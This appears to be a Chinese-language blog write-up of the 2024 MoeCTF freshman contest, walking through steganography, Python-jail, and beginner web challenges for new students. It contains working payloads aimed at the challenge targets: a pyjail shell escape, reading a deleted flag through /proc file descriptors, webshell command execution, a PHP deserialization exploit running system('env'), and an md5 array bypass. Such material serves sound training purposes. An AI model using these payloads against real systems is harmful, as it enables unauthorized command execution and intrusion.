---
title: '2024 MoeCTF 新生赛 Writeup'
description: '环境开启的一分钟内，将所有人员改成 已签到，luo 改成缺勤，点击完成即可拿到 flag'
pubDate: 2024-09-20
author: 'IHK-1'
tags: ['CTF', 'MoeCTF', '新生赛', '2024']
---

```plain
注：
 - 仅供南昌航空大学网安专业新生复现参考！
 - 所有 flag 请自行复现提交，请勿提交文章中的flag，否则账号会被封禁！
 - 不会的地方可以联系学长
```

# WEEK 1
## MISC
### singin
环境开启的一分钟内，将所有人员改成 已签到，luo 改成缺勤，点击完成即可拿到 flag

### 罗小黑战记

下载附件，得到一张动态图，<font style="background-color:#FCE75A;">图中偶尔会闪过一些信息</font>，尝试搜索在线网站，gif 图分解

【技巧】：<font style="background-color:#FCE75A;">很多东西需要自己搜索总结的，请自行尝试搜索，</font>作者就不提供链接了

进行 gif 分割，找到几张含有信息的图片

扫描二维码拿到 flag

### 杂项入门指北
其MISC入门指北的pdf文档中，提示我们 flag 在海报中

在海报中，侧面线条隐藏着莫斯密码

搜索一些解密网站，使用在线网站将莫斯密码解密拿到flag，推荐网站：[CyberChef](https://cyberchef.org/)

### ez_F5
下载得到一张妙蛙种子图片，其属性中含有密码

【技巧】：推荐可以<font style="background-color:#FCE75A;">自行总结一下 MISC 编码特征</font> ，或者查看他人文章，之后遇到这样的编码就可以快速的识别出是什么编码，base32 解密得到 no_password，

【技巧】：<font style="background-color:#FCE75A;">推荐使用 010editor 来分析二进制的文件</font>，因为其提供了丰富的模板，可以快速的定位各种信息

在模板中翻阅，看到一段信息

【技巧】：<font style="background-color:#FCE75A;">这段文字当你没有思路的时候可以搜索一下这是什么</font>，可以搜索到这是 F5 隐写的特征（当然根据题目名称也可以，但是需要丰富的做题经验）

使用 F5 隐写工具，具体使用方法需要自己搜索并总结，根据 no_password ，使用其作为密码进行解密，得到 flag

### 捂住一只耳
根据音频中的信息，得到以下数字

```plain
63 31 43 31 41 52 31 51 71 101

对应QWER上的键盘坐标，例如 63 为 第六排第三列字母，对应 N
N E V E R G E T U P
```

### redeme
连接后，有一个验证方式，其意思为 两端字符串 拼接，例如 A+B=? 即AB

```plain
--------------------------------------------------
# import ...

fd = open("/tmp/therealflag", "r")
the_real_flag = fd.read().strip() # u can't catch me, i am ________
os.system("rm /tmp/therealflag")

def handle(input, print) -> NoReturn:
    pass # not implemented yet
def main():
    pass # not implemented yet
if __name__ == "__main__":
    main()
--------------------------------------------------
```

由于无法直接拿到这个文件，但是这个python文件加载了 /tmp/therealflag ，<font style="background-color:#FCE75A;">那么思路可以转变为就需要找到一个文件可以查看到这个进程加载的内容</font>，经过搜索 kali 系统中 /proc/pid 中可以查实现，具体linux中 /proc/pid 各个目录的文件作用，还需自己查找总结

以下为一个示例：

先尝试了 /proc/1/environ 查看工作环境，发现其环境正是一个 python 环境，正对应了这个 python 文件，该文件进程为 pid=1 

那么我们可以根据 <font style="background-color:#FCE75A;">/proc/1/fd/id 继续查看程序链接（假设链接到的是打开的文件/proc/1/fd/1 链接到的是 /etc/passwd，那么打开 /proc/1/fd/1 等价于打开 /etc/passwd）</font>，注意： 请勿从 0/1/2 开始，可能会造成靶机卡死！

多此尝试，在/proc/1/fd/3  中查看到 flag

### pyjail
```plain
__import__('os').system('sh')
```

cat wrapper 获取到flag生成源码

查看 tmp 目录所有文件

但是文件名一直 cat 不到，直接尝试模糊匹配到

## WEB
### web入门指北
其web入门指北文件中，有 www 站点 附件，可以使用 study_php 进行站点搭建，<font style="background-color:#FCE75A;">具体自己搜索搭建</font>，关键词：小皮搭建网站，搭建完成后访问站点即可获取 flag

### 弗拉格之地的入口
其给出提示爬虫可以确定目录： robots.txt ，ROBOTS协议，用来指示搜索引擎爬虫哪些页面可以爬取，哪些不可以，当然也可以使用 dirsearch 等工具进行目录扫描，

在 robots.txt 中，其禁止爬虫爬取 webtutorEntry.php，访问即可拿到 flag

### ez_php
入门挑战，适合了解一些 HTTP协议，以及了解使用 burpsuite

HTTP协议参考网站：[HTTP | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP)

1.请求方法：

访问的适合其要求使用 POST 方法访问，将 GET 改为 POST 即可进行下一步，推荐在红圈位置处选择修改请求方法

2.POST 请求参数

3.GET 请求参数

4.访问来源 referer

5.Cookie

6.UserAgent

访问即可拿到 flag

### ProveYourLove
尝试了多次表白，发现其弹出的信息：

not yet fulfilled 提示我们表白的太少了，尝试使用 burpsuite 的 intruder 进行 nopayload 攻击，即使用任何payload，进行循环发送，一段时间后访问

拿到七夕的flag，以及该题目的 flag

### 弗拉格之地的挑战
根据提示页面，进行访问，html 中通常会把一些信息注释，不在前端显示出来，这时候 F12 查看源代码即可

第二个 flag，这时候不是在返回页面中看到信息，flag 被藏在了返回包的响应标头中

第三个 flag ，需要根据他的步骤，结合 ez_php 学习的传参方法进行解题

第四部分同样使用到了 ez_php 中的 referer http参数

由于该页面没有 9 选项（也可以用控制台输入9），那么只能分析他的源码部分，根据源码部分发现其 为你过关时，其会进行 POST flag4bbc.php 页面的操作，并发送 method=get ，那么我们也以 POST 请求，即可拿到 flag5

在第五个flag 页面中，输入 I want flag 并不能得到 flag，分析他的源代码，发现其插入了一段 js

当我们提交的适合，会触发这个 js，那我们不去触发这个 js，而是根据源码中的信息进行 post 发送，content=I want flag ，即可拿到 flag5 

第6部分是一个基础的代码审计

第一个 if 匹配 GET moe 参数 和 POST moe 参数是否传参，后面两个 if 分别为两个 正则匹配，两者区别为 第一个 /flag/ 另一个 /flag/i，多了一个修饰符，即不区分大小写

那么不处发第一个而触发第二个使用的方法为 大小写 绕过，发送Flag即可， 只要包含大写，则它不会被 flag 匹配，第二个因为不区分大小写则会被匹配到

第七个部分，其为一个 webshell ，那么我们使用任何的webshell 工具都可以执行，或者使用 POST 传参可以执行任意 php 代码，比如我 POST 传参 what=system('ls');，即执行系统命令 ls ，可以查看到目录下的所有文件

为了方便，我们推荐使用 webshell 工具进行连接，直接接管服务器，推荐：蚁剑

在服务器的根目录中拿到 flag7

最后拼接所有的 flag，base64解码得到flag

### pop_moe
这是一个 反序列化 题目，需要一定的基础，建议查看一些相关资料再尝试

以下为构造的链子，如果不会的话可以直接询问学长

```plain
// class000::__destruct --> class000::check --> class001::__incoke --> class002::__set --> class002::dangerous --> class003::evvval --> class003::mystr
```

构造的exp

```plain
<?php
class class003 {
    public $mystr = "?><?php system('env'); ?>";
}

class class002 {
    private $sec;
    public function __construct()
    {
        $this->sec = new class003();
    }
}

class class001 {
    public $payl0ad;
    public $a;
}

class class000 {
    private $payl0ad = 1;
    public $what;
}

$a = new class002();

$b = new class001();
$b -> a = $a;
$b -> payl0ad = "dangerous";

$c = new class000();
$c -> what = $b;

echo urlencode(serialize($c));
?>
```

# WEEK 2
## WEB
### 静态网页
肯定隐藏在js中，尝试直接全局搜索

切入 final1l1l_challenge.php 页面

分析逻辑为：需要GET传入a以及POST传参b，同时要求 a 和 b 都不为数字，且 a 为 0，b[a] 时为 md5(a)，只需要构造 b 为字典，a为任意不为数字的值即可

```plain
需要构造 a='a' 和 b['a'] = md5('a')
即：
  GET ?a=a
  POST b[a]=0cc175b9c0f1b6a831c399e269772661
```

